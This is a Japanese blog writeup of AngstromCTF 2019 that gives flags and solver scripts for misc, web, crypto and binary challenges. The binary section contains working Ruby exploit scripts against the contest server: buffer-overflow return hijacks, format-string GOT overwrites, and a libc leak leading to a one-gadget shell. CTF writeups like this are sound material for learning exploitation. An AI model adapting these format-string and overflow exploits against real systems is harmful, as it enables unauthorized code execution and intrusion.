---
title: "Angstrom2019 writeup"
date: 2019-04-25T21:57:22+09:00
draft: false
categories:
- writeup
---

## Misc

### IRC

- freenodeに入るとFLAG
- **actf{like_discord_but_worse}**

## The mueller Report

- PDFが渡されるので、とりあえず`actf`でgrepするとFLAG
- **actf{no0o0o0_col1l1l1luuuusiioooon}**

## Blank PDF

- PDFが渡されるが開けず、`file`コマンドで見るとPDFとして認識されていないためヘッダーを見るとマジックナンバーがかけているので直してあげると開けるようになりFLAG
- **actf{knot_very_interesting}**

## Paper Trail

- pcapngが渡されるので、Follow TCP StreamするとIRCで1文字ずつFLAGを送信している
- **actf{fake_math_papers}**

##  Scratch It Out

- project.jsonという謎のjsonファイルが渡されるので、キーでいろいろぐぐる＆問題名からプログラミング言語Scratchの話だとわかる
- project.jsonをzipで圧縮し、htt@s://scratch.mit.edu でファイルを読み込まされるとゲームが復元される
- 最初の項目が、「旗が押されたとき」なので、画面右らへんの緑色の旗を押すと音声とともにFLAGがでる
- 地味に面白い
- **actf{Th5_0pT1maL_LANgUaG3}**

## Web

### Control you

- HTMLソースを見てFLAG
- **actf{control_u_so_we_can't_control_you}**

## Crypto

### Classy Cipher

- ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く
- **actf{so_charming}**

```python
encrypted = ':<M?TLH8<A:KFBG@V'

for i in range(0xff):
    for c in encrypted:
        print(chr((ord(c)-i) % 0xff), end='')
```

### Really Secure Algorithm

- RSAのパラメータがe, p, q, cが渡されるので復号するだけ
- **actf{really_securent_algorithm}**

```ruby
require_relative '../../tools/ctf/crypto.rb'

p = 8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889
q = 7755060911995462151580541927524289685569492828780752345560845093073545403776129013139174889414744570087561926915046519199304042166351530778365529171009493
e = 65537
c = 7022848098469230958320047471938217952907600532361296142412318653611729265921488278588086423574875352145477376594391159805651080223698576708934993951618464460109422377329972737876060167903857613763294932326619266281725900497427458047861973153012506595691389361443123047595975834017549312356282859235890330349

rsa = RSA.new(e, p * q, p, q)
m = rsa.decrypt(c)
print([m.to_s(16)].pack("H*"))
```

## Half and Half

- ソースコードが渡されるので呼んでソルバを書くだけ
  - 24文字を12byteに分割しxor取った値に等しくなるようにする
  - フラグフォーマットは、`actf{`なので先頭5byteと後半の5byteもxorして判明(`taste`)
  - 問題文から`taste`に合うような単語で`coffee`を`actf{`の後に繋げると後半が`good`と文章が成り立つ
- **actf{coffee_tastes_good}**

## Runes

- Paillier暗号のパラメータn, g と暗号文cが渡されるので復号するだけ
  - 復号時に素数p, qが必要になるが、提供されているnは、factordbでググるとすでに割れている
- **actf{crypto_lives}**

```ruby
require 'gmp'

n = GMP::Z(99157116611790833573985267443453374677300242114595736901854871276546481648883)
p = 310013024566643256138761337388255591613
q = 319848228152346890121384041219876391791
g = GMP::Z(99157116611790833573985267443453374677300242114595736901854871276546481648884)
c = GMP::Z(2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869)
l = GMP::Z((p - 1).lcm(q - 1))
def L(u, n)
  (u - 1) / n
end
c_lambda = L(c.powmod(l, n.pow(2)), n)
g_lambda = GMP::Z(L(g.powmod(l, n.pow(2)), n).to_s.to_i).invert(n)
m = ((c_lambda * g_lambda) % n).to_s.to_i.to_s(16)
print([m].pack("H*"))
```

## Binary

### Aquarium
- gets関数によるBOFがあるバイナリで、flag出力用の関数があるのでそこに飛ばすだけ
- **actf{overflowed_more_than_just_a_fish_tank}**

```ruby
#!/usr/bin/env ruby

require 'pwn'

#z = Sock.new "localhost", 9999
z = Sock.new "shell.actf.co", 19305

payload = "A" * 0x98 + p32(0x4011b6)
z.recvuntil ": "
z.sendline "1"
z.recvuntil ": "
z.sendline "1"
z.recvuntil ": "
z.sendline "1"
z.recvuntil ": "
z.sendline "1"
z.recvuntil ": "
z.sendline "1"
z.recvuntil ": "
z.sendline "1"
z.recvuntil ": "
z.sendline payload

puts z.recv
```

### Chain of Rope

- 名前からしてROPかと思ったけど、そうではなく単純なBOFでリターンアドレスをflag出力用関数に書き換えるだけ(Aquariumとまったく同じ)
- **actf{dark_web_bargains}**

```ruby
#!/usr/bin/env ruby

require 'pwn'

z = Sock.new "localhost", 9999
z = Sock.new "shell.actf.co", 19400

puts z.recvuntil("access\n")
z.sendline "1"

payload = "A" * 0x38 + p64(0x401231)
z.sendline payload

p z.recv
```

### Purchases

- FSBがある64bitバイナリで、flag出力用の関数があるのでそこに飛ばしてあげる
- 関数の最後にGOTによるアドレス解決がされていないputs関数があるので、putsのGOTをflag出力関数で上書きする
  - 末尾2byteですむので楽に書き換えられる
- **actf{limited_edition_flag}**

```ruby
#!/usr/bin/env ruby
require 'pwn'
# z = Sock.new "localhost", 9999
z = Sock.new "shell.actf.co", 19011
puts z.recvuntil "? "
z.sendline "%4534c%10$hnAAAA\x18\x40\x40"
puts z.recvuntil "else. "
puts z.recv
```

### Returns

- Purchasesのflag出力用関数が無い版でそれ以外はすべて同じ
- libcが配布されているので、FSBでlibcのアドレスリークして、GOT overwrite でOne gadgetに飛ばしてシェルを奪う
- 出力バイトの関係から分割して書き込むために、はじめに`puts@got`をmainに書き換えておき何度もFSBを使えるようにする
- `__stack_chk_fail@got`は、通常一度も呼ばれないため、ここのGOTをOne gadgetに書き換える
- 最後に、`puts@got`を`__stack_chk_fail@got`になおしてあげればOne gadgetが実行される
- **actf{no_returns_allowed}**

```ruby
#!/usr/bin/env ruby
# coding: utf-8
require 'pwn'
#z = Sock.new "localhost", 8888
z = Sock.new "shell.actf.co", 19307
context.log_level = :debug
libc = ELF.new "./libc.so.6"
#z = Sock.new "shell.actf.co", 19011
puts z.recvuntil "? "

# Leaking libc address and overwriting puts@got to the entrypoint of main function
z.sendline "%4518c%11$hnAAAABBB%17$p\x18\x40\x40"
data = z.recvuntil "? "
data = data.gsub(/\s/,"")
libc_start_main = data.match(/BBB(.*)@@\./)[1].chop.to_i(16) - 240
libc_base = libc_start_main - libc.symbols['__libc_start_main']
puts "libc base address = #{libc_base.to_s(16)}"

one_gadget = libc_base + 0xf02a4
high = (one_gadget & 0xffffffff00000000) >> 32
low = one_gadget & 0xffffffff
llow = (low & 0xffff0000) >> 16
hlow = low & 0xffff

# Overwriting __stack_chk_fail@got to one gadget RCE
payload = "%#{high}c%11$hnAAAABBBBBBB\x2c\x40\x40"
z.sendline payload
z.recvuntil "? "

payload = "%#{hlow}c%11$hnAAAABBBBBBB\x28\x40\x40"
z.sendline payload
z.recvuntil "? "

payload = "%#{llow}c%11$hnAAAABBBBBBB\x2a\x40\x40"
z.sendline payload
z.recvuntil "? "

STDIN.gets
payload = "%4892c%11$hnAAAABBB%17$p\x18\x40\x40"
z.sendline payload

z.interact
```
